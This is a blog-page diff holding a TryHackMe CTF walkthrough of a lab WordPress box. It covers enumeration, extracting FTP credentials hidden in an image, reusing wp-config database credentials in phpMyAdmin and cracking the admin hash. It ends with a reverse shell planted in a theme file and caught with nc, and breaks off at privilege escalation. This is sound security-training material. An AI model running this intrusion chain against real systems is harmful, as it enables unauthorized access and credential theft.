@@ -1,0 +1,1026 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Dodge rabbit holes and work on WordPress CMS with heavy staganography and a lot of restarts. Still recommended!'><title>Different CTF</title>
+
+<link rel='canonical' href='/p/different-ctf/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Different CTF'>
+<meta property='og:description' content='Dodge rabbit holes and work on WordPress CMS with heavy staganography and a lot of restarts. Still recommended!'>
+<meta property='og:url' content='/p/different-ctf/'>
+<meta property='og:site_name' content='Tanishq Chaudhary'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='cms' /><meta property='article:tag' content='steganography' /><meta property='article:tag' content='phpmyadmin' /><meta property='article:tag' content='brute-forcing' /><meta property='article:published_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='og:image' content='https://i.imgur.com/uAE0SRq.png' />
+<meta name="twitter:title" content="Different CTF">
+<meta name="twitter:description" content="Dodge rabbit holes and work on WordPress CMS with heavy staganography and a lot of restarts. Still recommended!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://i.imgur.com/uAE0SRq.png' />
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu8feb5f378a01bc01544f018dbe1cdca8_26024_300x0_resize_q75_box.jpeg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="/">Tanishq Chaudhary</a></h1>
+        <h2 class="site-description">This is where I flex.</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/categories/htb'>
+                
+                    <?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="400.000000pt" height="400.000000pt" viewBox="0 0 400.000000 400.000000"
+ preserveAspectRatio="xMidYMid meet">
+
+<g transform="translate(0.000000,400.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M0 2000 l0 -2000 2000 0 2000 0 0 2000 0 2000 -2000 0 -2000 0 0
+-2000z m2148 1202 c117 -69 196 -115 683 -396 173 -100 261 -157 270 -174 21
+-38 20 -1251 0 -1276 -16 -19 -74 -54 -606 -360 -198 -115 -382 -221 -408
+-237 -89 -54 -66 -62 -512 196 -115 67 -302 175 -415 240 -113 64 -220 128
+-237 142 l-33 24 0 633 c0 607 1 633 19 653 10 11 178 112 372 224 194 112
+428 247 519 300 112 66 176 97 198 98 24 1 65 -18 150 -67z"/>
+<path d="M1860 2961 c-63 -37 -222 -130 -352 -205 -246 -143 -268 -161 -232
+-196 19 -18 614 -365 689 -402 l41 -20 349 202 c193 111 358 209 369 219 31
+32 12 55 -97 119 -411 241 -609 352 -629 352 -13 -1 -75 -31 -138 -69z"/>
+<path d="M1116 2334 c-14 -14 -16 -67 -16 -435 l0 -419 38 -24 c20 -13 125
+-75 232 -137 107 -62 252 -145 322 -186 70 -40 136 -73 146 -73 41 0 42 6 42
+440 0 228 -4 420 -8 427 -4 6 -50 36 -102 66 -52 29 -213 122 -356 205 -144
+84 -266 152 -272 152 -6 0 -18 -7 -26 -16z"/>
+<path d="M2813 2330 c-18 -10 -132 -77 -255 -148 -123 -71 -268 -155 -323
+-187 -55 -32 -103 -63 -107 -69 -4 -6 -8 -198 -8 -426 0 -434 1 -440 42 -440
+11 0 94 44 186 97 92 53 247 143 345 199 98 56 184 108 192 114 13 11 15 75
+15 431 0 366 -2 420 -16 433 -20 21 -32 20 -71 -4z"/>
+</g>
+</svg>
+
+                
+                <span>HackTheBox Writeups</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/categories/thm'>
+                
+                    <?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="552.000000pt" height="564.000000pt" viewBox="0 0 552.000000 564.000000"
+ preserveAspectRatio="xMidYMid meet">
+
+<g transform="translate(0.000000,564.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M2280 5630 c-345 -48 -646 -195 -885 -435 -126 -126 -204 -230 -280
+-377 -52 -99 -134 -321 -135 -363 -1 -35 -14 -44 -91 -59 -231 -44 -420 -147
+-583 -316 -131 -136 -210 -272 -260 -444 -110 -380 4 -796 293 -1069 131 -123
+296 -215 478 -265 l98 -27 905 -3 c849 -2 907 -1 940 15 104 53 108 192 7 267
+-28 21 -35 21 -935 26 l-907 5 -88 31 c-205 74 -358 209 -451 399 -46 93 -66
+170 -73 285 -22 360 213 680 574 782 110 31 286 31 396 0 81 -23 162 -60 243
+-112 80 -50 172 -34 221 39 29 43 31 113 3 158 -49 81 -222 167 -457 229 -9 2
+-8 16 3 56 121 413 449 731 871 845 91 25 113 27 298 27 185 0 207 -2 298 -27
+450 -121 794 -479 892 -927 13 -58 13 -66 -2 -75 -8 -5 -44 -28 -79 -50 -35
+-23 -72 -51 -80 -64 -39 -55 -34 -142 9 -189 62 -67 140 -68 240 -3 215 140
+505 156 742 42 210 -102 354 -275 418 -504 28 -98 57 -139 114 -158 71 -23
+153 15 184 87 24 54 21 85 -23 219 -95 292 -323 537 -609 656 -144 59 -208 70
+-416 76 l-192 5 -12 52 c-6 28 -27 96 -46 150 -177 510 -603 883 -1138 996
+-114 24 -378 35 -485 20z"/>
+<path d="M3605 3136 c-45 -19 -92 -79 -110 -138 -20 -68 -20 -257 0 -325 32
+-107 101 -163 200 -163 140 1 204 87 213 285 8 180 -34 296 -121 336 -49 22
+-138 24 -182 5z m109 -96 c49 -18 61 -61 61 -210 0 -118 -3 -139 -21 -170 -17
+-30 -25 -35 -58 -35 -31 0 -43 6 -60 28 -19 26 -21 42 -21 170 0 172 10 204
+72 226 1 1 13 -3 27 -9z"/>
+<path d="M5120 3128 c-35 -18 -51 -35 -72 -78 -66 -133 -56 -381 19 -471 55
+-66 166 -88 249 -50 75 34 112 113 121 258 10 158 -28 281 -104 333 -53 36
+-151 40 -213 8z m147 -100 c26 -21 38 -85 38 -203 -1 -138 -16 -190 -59 -201
+-36 -9 -69 1 -84 26 -33 54 -33 306 -1 359 24 38 72 46 106 19z"/>
+<path d="M3104 3069 c-49 -39 -93 -74 -98 -79 -9 -9 40 -80 56 -80 6 0 32 18
+58 40 26 22 49 40 51 40 2 0 2 -106 0 -235 l-3 -235 71 0 71 0 0 310 0 310
+-59 0 c-58 0 -60 -1 -147 -71z"/>
+<path d="M4639 3074 c-123 -96 -117 -87 -85 -128 15 -20 31 -36 36 -36 4 0 32
+20 62 44 l53 43 -3 -238 -3 -239 66 0 65 0 0 310 0 310 -53 0 c-51 0 -58 -3
+-138 -66z"/>
+<path d="M4625 2196 c-90 -25 -135 -101 -150 -256 -9 -83 9 -206 37 -266 41
+-88 134 -129 239 -104 64 16 111 60 135 132 26 72 26 291 1 357 -46 119 -142
+169 -262 137z m97 -107 c28 -15 47 -66 54 -147 14 -153 -18 -263 -80 -270 -62
+-7 -88 53 -88 206 0 122 13 185 45 207 25 18 41 19 69 4z"/>
+<path d="M3101 2120 c-55 -44 -101 -83 -101 -86 0 -8 54 -74 62 -74 3 0 30 20
+60 44 l53 43 -4 -238 -3 -239 71 0 71 0 -2 313 -3 312 -51 3 c-51 3 -53 2
+-153 -78z"/>
+<path d="M3601 2120 c-56 -44 -101 -83 -101 -88 0 -4 13 -23 29 -42 l29 -34
+59 45 58 46 -3 -238 -3 -239 65 0 66 0 0 315 0 315 -49 0 c-47 0 -55 -4 -150
+-80z"/>
+<path d="M4125 2142 c-39 -31 -84 -68 -102 -82 l-32 -25 34 -40 33 -39 59 46
+58 45 -3 -238 -3 -239 66 0 65 0 0 315 0 315 -52 -1 c-49 0 -58 -5 -123 -57z"/>
+<path d="M4974 1356 c-71 -32 -98 -104 -92 -246 3 -73 8 -104 24 -130 58 -101
+196 -108 255 -14 21 34 24 53 27 154 3 104 1 119 -20 159 -13 25 -35 53 -49
+64 -34 25 -105 31 -145 13z m103 -93 c14 -21 18 -48 18 -128 0 -80 -4 -107
+-18 -128 -22 -34 -61 -36 -81 -4 -36 54 -27 254 12 277 29 16 51 11 69 -17z"/>
+<path d="M3073 1353 c-40 -8 -81 -59 -94 -117 -17 -77 -8 -214 17 -257 32 -55
+80 -82 137 -76 102 9 141 71 141 222 0 113 -21 180 -68 210 -27 18 -94 27
+-133 18z m92 -103 c10 -20 15 -58 15 -119 0 -129 -17 -162 -75 -147 -33 8 -48
+68 -43 173 3 62 9 88 23 103 27 30 62 26 80 -10z"/>
+<path d="M3769 1345 c-23 -10 -44 -31 -60 -58 -22 -38 -24 -54 -24 -157 0
+-130 13 -166 76 -208 27 -19 43 -23 82 -19 102 9 141 71 142 222 0 155 -40
+223 -138 231 -24 2 -57 -3 -78 -11z m108 -95 c8 -15 13 -64 13 -120 0 -56 -5
+-105 -13 -120 -17 -33 -57 -38 -83 -9 -16 18 -19 36 -19 129 0 93 3 111 19
+129 26 29 66 24 83 -9z"/>
+<path d="M5328 1304 c-38 -30 -68 -58 -68 -62 1 -4 9 -17 20 -30 21 -26 39
+-21 74 17 11 12 22 21 25 21 4 0 5 -76 3 -170 l-4 -170 51 0 51 0 0 225 0 225
+-42 0 c-37 0 -52 -8 -110 -56z"/>
+<path d="M3407 1294 c-67 -55 -70 -61 -39 -96 14 -16 17 -16 53 13 l39 31 0
+-166 0 -166 50 0 50 0 0 220 0 220 -42 0 c-37 0 -52 -8 -111 -56z"/>
+<path d="M4117 1294 c-67 -55 -70 -61 -39 -96 14 -16 17 -16 52 12 21 17 39
+30 41 30 2 0 3 -74 1 -165 l-3 -165 50 0 51 0 0 220 0 220 -42 0 c-37 0 -52
+-8 -111 -56z"/>
+<path d="M4561 825 c-49 -42 -64 -98 -59 -217 6 -156 45 -208 155 -208 100 0
+148 75 147 231 -1 92 -23 158 -65 194 -25 20 -41 25 -89 25 -48 0 -64 -5 -89
+-25z m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27
+-72 0 -16 18 -19 37 -19 134 0 97 3 116 19 134 11 12 27 21 36 21 9 0 25 -9
+36 -21z"/>
+<path d="M4942 795 c-40 -31 -72 -59 -72 -63 0 -4 9 -18 19 -32 l20 -25 40 33
+41 33 0 -171 0 -171 48 3 47 3 0 220 0 220 -36 3 c-30 3 -46 -5 -107 -53z"/>
+<path d="M5271 825 c-49 -42 -64 -98 -59 -217 6 -156 45 -208 157 -208 48 0
+57 3 91 38 32 32 39 47 50 110 20 119 -5 229 -62 277 -43 36 -133 36 -177 0z
+m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
+0 -16 18 -19 37 -19 134 0 97 3 116 19 134 11 12 27 21 36 21 9 0 25 -9 36
+-21z"/>
+<path d="M3019 715 c-69 -37 -81 -224 -19 -287 52 -51 146 -32 169 34 19 54
+14 178 -9 216 -31 50 -89 65 -141 37z m79 -58 c18 -21 25 -109 13 -154 -14
+-50 -39 -63 -63 -33 -20 25 -25 130 -8 174 10 28 40 35 58 13z"/>
+<path d="M3280 684 c-53 -42 -54 -43 -35 -68 15 -19 15 -19 38 2 13 12 26 22
+30 22 4 0 7 -54 7 -121 l0 -120 33 3 32 3 3 158 3 157 -33 0 c-23 0 -47 -11
+-78 -36z"/>
+<path d="M3913 320 c-35 -14 -55 -55 -61 -125 -5 -73 11 -145 38 -170 10 -9
+37 -19 59 -22 80 -11 121 45 121 164 0 127 -65 190 -157 153z m77 -65 c14 -17
+18 -136 6 -172 -9 -29 -35 -37 -57 -17 -15 14 -19 32 -19 91 0 41 5 83 10 94
+13 23 43 25 60 4z"/>
+<path d="M4167 284 c-52 -40 -52 -41 -33 -67 13 -17 15 -16 45 9 l31 26 0
+-126 0 -126 30 0 30 0 0 160 0 160 -28 0 c-18 0 -47 -14 -75 -36z"/>
+</g>
+</svg>
+
+                
+                <span>TryHackMe Writeups</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/tags/'>
+                
+                    <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 width="500.536px" height="500.536px" viewBox="0 0 500.536 500.536" style="enable-background:new 0 0 500.536 500.536;"
+	 xml:space="preserve">
+<g>
+	<path d="M410.614,323.309L186.108,98.815c-2.444-2.444-5.754-3.818-9.212-3.818H94.702c-5.925-7.524-13.878-13.97-23.241-18.613
+		c-22.529-11.198-47.907-9.351-61.738,4.465c-2.554,2.556-4.661,5.473-6.239,8.674c-5.11,10.272-4.581,22.481,1.472,34.362
+		c5.834,11.464,16.178,21.311,29.143,27.745c5.816,2.887,11.818,4.888,17.765,6.064v62.329c0.006,3.458,1.38,6.78,3.824,9.218
+		l224.494,224.499c5.095,5.096,13.34,5.096,18.436,0L410.62,341.738C415.703,336.655,415.703,328.403,410.614,323.309z
+		 M55.688,98.815c-2.438,2.438-3.818,5.763-3.818,9.212v40.802c-4.648-1.067-9.327-2.713-13.905-4.983
+		c-11.298-5.609-20.28-14.097-25.263-23.909c-4.776-9.369-5.284-18.799-1.434-26.545c1.162-2.355,2.705-4.51,4.604-6.393
+		c11.222-11.222,32.492-12.383,51.725-2.831c5.861,2.905,11.065,6.591,15.448,10.829H64.905
+		C61.445,94.988,58.132,96.365,55.688,98.815z M84.364,127.497c3.487-3.49,7.826-5.627,12.354-6.428
+		c0.399,4.82-0.375,9.425-2.415,13.547c-1.162,2.355-2.71,4.51-4.61,6.398c-3.18,3.183-7.19,5.523-11.724,7.075
+		C76.635,140.85,78.76,133.098,84.364,127.497z M117.139,160.272c-9.049,9.049-23.726,9.049-32.775,0
+		c-1.271-1.271-2.353-2.657-3.257-4.125c5.654-1.969,10.702-4.947,14.738-8.984c2.557-2.554,4.661-5.471,6.242-8.671
+		c2.657-5.353,3.76-11.225,3.378-17.295c4.28,0.883,8.364,2.979,11.68,6.301C126.188,136.546,126.188,151.217,117.139,160.272z
+		 M496.717,315.631L384.725,427.628c-5.095,5.089-13.352,5.089-18.441,0l-5.674-5.675l69.83-69.841
+		c4.899-4.889,7.589-11.391,7.589-18.3c0-6.91-2.684-13.412-7.583-18.294L205.957,91.013c-4.903-4.891-11.399-7.578-18.291-7.578
+		h-49.694v-1.519c0-3.455,1.38-6.773,3.827-9.218c2.444-2.441,5.748-3.818,9.206-3.818h18.146
+		c-4.389-4.232-9.599-7.923-15.447-10.829c-19.24-9.552-40.51-8.39-51.731,2.832c-1.894,1.882-3.431,4.037-4.613,6.393
+		c-0.556,1.138-0.999,2.311-1.374,3.517c-2.474-1.581-5.003-3.083-7.654-4.412c0.381-0.999,0.762-2.004,1.241-2.974
+		c1.596-3.194,3.691-6.111,6.25-8.674c13.819-13.816,39.215-15.658,61.738-4.466c9.357,4.643,17.315,11.089,23.235,18.613h82.198
+		c3.446,0,6.768,1.377,9.215,3.818l224.496,224.497C501.812,302.29,501.812,310.548,496.717,315.631z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+                
+                <span>Tags</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/different-ctf/">
+                
+                    <img src="https://i.imgur.com/uAE0SRq.png" loading="lazy" alt="Featured image of post Different CTF" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/thm/" style="background-color: #2a9d8f; color: #fff;">
+                TryHackMe
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/different-ctf/">Different CTF</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        Dodge rabbit holes and work on WordPress CMS with heavy staganography and a lot of restarts. Still recommended!
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Jun 15, 2021</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <p><a class="link" href="https://tryhackme.com/room/adana"  target="_blank" rel="noopener"
+    >Play</a></p>
+<p>NOTE: There is an issue in the machine sometimes. On a previous run, I got:
+<img src="https://i.imgur.com/ZMCTsca.png" alt="Home page of the website showing a database error"  />
+<code>nmap</code> shows its a WordPress website, but &hellip; we do not see anything here except the error.</p>
+<p>Redeploy the machine to fix the error. You <em>may</em> also see it later, and not immediately. Don&rsquo;t panic, just reset.</p>
+<h2 id="1-scanning--enumeration">1. Scanning &amp; Enumeration</h2>
+<p>We do the below scans in parallel.</p>
+<h3 id="11-port-scanning">1.1. Port Scanning</h3>
+<pre><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: WordPress 5.6
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Hello World &amp;#8211; Just another WordPress site
+Service Info: OS: Unix
+</code></pre><p>Nothing special.</p>
+<h3 id="12-web-enumeration">1.2. Web Enumeration</h3>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u adana.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 108 -q
+/wp-content           (Status: 301) [Size: 311] [--&gt; http://adana.thm/wp-content/]
+/wp-login.php         (Status: 200) [Size: 6544]                                  
+/license.txt          (Status: 200) [Size: 19915]                                 
+/announcements        (Status: 301) [Size: 314] [--&gt; http://adana.thm/announcements/]
+/wp-includes          (Status: 301) [Size: 312] [--&gt; http://adana.thm/wp-includes/]  
+/javascript           (Status: 301) [Size: 311] [--&gt; http://adana.thm/javascript/]   
+/readme.html          (Status: 200) [Size: 7278]                                     
+/wp-admin             (Status: 301) [Size: 309] [--&gt; http://adana.thm/wp-admin/]     
+/phpmyadmin           (Status: 301) [Size: 311] [--&gt; http://adana.thm/phpmyadmin/]   
+/xmlrpc.php           (Status: 200) [Size: 0]                                        
+/wp-signup.php        (Status: 500) [Size: 2609]                                     
+</code></pre><p>Take note of:</p>
+<ul>
+<li>announcements</li>
+<li>phpmyadmin</li>
+</ul>
+<p>Rest looks generic WordPress stuff.</p>
+<h3 id="13-web-exploration">1.3. Web Exploration</h3>
+<p>Add the line <code>10.10.195.53    adana.thm</code> in <code>/etc/hosts</code>. How do I know <code>adana.thm</code> is the domain name? Check the source code!</p>
+<p><img src="https://i.imgur.com/wp7s0UF.png" alt="WordPress website mainpage"  /></p>
+<p>Info gathered:</p>
+<ul>
+<li>Standard WordPress website</li>
+<li><code>hakanbey01</code> is the only user, thus the admin</li>
+</ul>
+<p>We find the &ldquo;hidden directory&rdquo;,
+<img src="https://i.imgur.com/c1twr1H.png" alt="hidden directory contents"  /></p>
+<h3 id="14-steganography">1.4. Steganography</h3>
+<p>Interesting. Checking the <code>strings</code> and the <code>binwalk</code> commands showed nothing, however, <code>steghide</code> allows me to enter a passphrase.</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ steghide --extract --stegofile ant.jpg
+Enter passphrase: 
+steghide: could not extract any data with that passphrase!
+</code></pre><p>Time to use <a class="link" href="https://github.com/RickdeJager/stegseek"  target="_blank" rel="noopener"
+    >stegseek</a>!</p>
+<p>Against what list? The one given to us in the same directory :)</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ stegseek -wl wordlist.txt ant.jpg
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: &quot;123adana{sorry, the rest was so tasty ... }&quot;
+[i] Original filename: &quot;user-pass-ftp.txt&quot;.
+[i] Extracting to &quot;ant.jpg.out&quot;.
+
+
+┌──(kali㉿kali)-[/tmp]
+└─$ cat ant.jpg.out
+RlRQLUxPR0{hidden ... }
+</code></pre><p>We decode this, which looks like a base64. It gives us FTP credentials! Also, quite interesting is the same prefix is used for both the passwords &hellip;</p>
+<h3 id="15-ftp">1.5 FTP</h3>
+<p>Looking around, we get an interesting file, <code>wp-config.php</code>.</p>
+<pre><code>&lt;?php
+
+...
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'phpmyadmin1' );
+
+/** MySQL database username */
+define( 'DB_USER', '{I hid this ;) }' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '{oooo noice}' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+...
+</code></pre><p>Info gathered:</p>
+<ul>
+<li>Database name</li>
+<li>Database username</li>
+<li>Database password</li>
+<li>Database hostname</li>
+</ul>
+<p>We have the database credentials &hellip; how could we use them?</p>
+<h3 id="16-phpmyadmin">1.6. phpMyAdmin</h3>
+<p>Recall we saw <code>/phpmyadmin/</code>. Login with the database credentials we saw in the config.</p>
+<p><img src="https://i.imgur.com/yvHbpz9.png" alt="Errors in creds in phpmyadmin"  /></p>
+<p>If at this point, you see a bunch of errors, restart the machine. They should NOT happen, and the creds <em>are</em> correct.</p>
+<p>Make sure to re-edit your <code>/etc/hosts</code> file.</p>
+<p><img src="https://i.imgur.com/F8WN2dC.png" alt="phpMyAdmin administrator page"  /></p>
+<p>We are in!</p>
+<p>Let&rsquo;s go to the database we saw eariler. In the <code>wp_users</code> tab, we see the username (which we saw earlier) and password hash!</p>
+<h3 id="17-hash-cracking">1.7. Hash Cracking</h3>
+<p>Find the correct mode in hashcat, and we have:</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ hashcat -m {mode} hash.txt /usr/share/wordlists/rockyou.txt --quiet
+{hash}:{password :D }
+</code></pre><p>YES!</p>
+<h3 id="18-wordpress-login">1.8. WordPress Login</h3>
+<p><img src="https://i.imgur.com/aqVgSnL.png" alt="WordPress login page, entering credentials we saw above"  /></p>
+<p>Uh oh. Checking the <code>wp-config</code> again, we see:</p>
+<pre><code>/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+</code></pre><p>sneaky, don&rsquo;t you think? Could be <code>adana.thm</code> &hellip; or maybe it isn&rsquo;t. Checking the <code>wp_options</code> tab on <code>/phpmyadmin/</code>, we get the <strong>subdomain</strong> :D</p>
+<h3 id="19-wordpress-login-in-subdomain">1.9. WordPress Login in Subdomain</h3>
+<p>Edit the line
+<code>10.10.190.211   adana.thm</code>
+to
+<code>10.10.190.211   adana.thm subdomain.adana.thm</code>.</p>
+<p><img src="https://i.imgur.com/mru5pq8.png" alt="WordPress admin page on the subdomain"  /></p>
+<p>We are in!</p>
+<h2 id="2-foothold">2. Foothold</h2>
+<p>I know of two ways we can get a shell:</p>
+<ol>
+<li>Appearance -&gt; Theme Editor -&gt; edit 404.php</li>
+<li>Plugins -&gt; Add new -&gt; Upload zip of phprevshell.</li>
+</ol>
+<p>However, we see:</p>
+<ol>
+<li>
+<p><img src="https://i.imgur.com/rTWJrLa.png" alt="404.php edit page permissions error"  /></p>
+</li>
+<li>
+<p><img src="https://i.imgur.com/r38C0xu.png" alt="add new plugin page permissions error"  /></p>
+</li>
+</ol>
+<p>a permission error for both. If only there was a way we could edit the file permissions &hellip;</p>
+<h3 id="21-ftp-again">2.1. FTP (again)</h3>
+<pre><code>ftp&gt; pwd
+257 &quot;/wp-content/themes/twentynineteen&quot; is the current directory
+ftp&gt; chmod 777 404.php
+200 SITE CHMOD command ok.
+</code></pre><p>Upload a reverse shell using the route 1 mentioned above. Shell taken from <a class="link" href="https://www.revshells.com/"  target="_blank" rel="noopener"
+    >Reverse Shell Generator</a>.</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ nc -lnvp 443           
+listening on [any] 443 ...
+connect to [10.17.8.184] from (UNKNOWN) [10.10.190.211] 43448
+Linux ubuntu 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 04:31:28 up 23 min,  0 users,  load average: 0.01, 0.02, 0.09
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ pwd
+/
+$ 
+</code></pre><p>We are in the system!</p>
+<h2 id="3-privesc">3. PrivEsc</h2>
